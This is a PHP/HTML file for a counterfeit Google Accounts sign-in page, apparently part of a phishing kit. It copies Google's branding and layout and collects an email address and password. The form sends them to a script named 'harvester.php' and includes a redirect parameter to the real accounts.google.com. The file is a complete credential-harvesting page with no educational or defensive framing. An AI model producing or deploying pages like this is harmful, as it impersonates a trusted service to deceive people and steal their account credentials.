<?php
require_once __DIR__ . '/config.php';
$cfg = require __DIR__ . '/config.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in - Google Accounts</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:"Google Sans",Roboto,Arial,sans-serif;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;width:450px;max-width:100%}
.logo{text-align:center;margin-bottom:16px}
.logo svg{width:75px;height:24px}
h1{font-size:24px;font-weight:400;color:#202124;margin-bottom:8px;text-align:center}
.sub{font-size:16px;color:#202124;margin-bottom:24px;text-align:center}
.field{margin-bottom:24px}
.field input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none}
.field input:focus{border-color:#1a73e8;border-width:2px;padding:12px 14px}
.row{display:flex;justify-content:space-between;align-items:center;margin-bottom:32px}
.row a{color:#1a73e8;font-size:14px;text-decoration:none;font-weight:500}
.row a:hover{text-decoration:underline}
.actions{display:flex;justify-content:flex-end}
button{background:#1a73e8;color:#fff;border:none;padding:9px 23px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer}
button:hover{background:#1765cc;box-shadow:0 1px 2px rgba(0,0,0,.2)}
.foot{margin-top:40px;font-size:12px;color:#5f6368;text-align:center}
.foot a{color:#5f6368;text-decoration:none;margin:0 8px}
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg"><path fill="#4285F4" d="M7.5 2.4l-7.5 12 7.5 7.2 7.5-7.2z"/><text x="18" y="18" font-family="Arial" font-size="18" fill="#5f6368">Google</text></svg>
  </div>
  <h1>Sign in</h1>
  <div class="sub">Use your Google Account</div>
  <form method="POST" action="harvester.php?next=https://accounts.google.com">
    <div class="field"><input type="email" name="email" placeholder="Email or phone" autocomplete="username" required></div>
    <div class="field"><input type="password" name="pass" placeholder="Enter your password" autocomplete="current-password" required></div>
    <div class="row">
      <a href="#">Forgot email?</a>
      <a href="#">Forgot password?</a>
    </div>
    <div class="actions"><button type="submit">Next</button></div>
  </form>
</div>
<div class="foot">
  <a href="#">English (United States)</a>
  <a href="#">Help</a>
  <a href="#">Privacy</a>
  <a href="#">Terms</a>
</div>
</body>
</html>
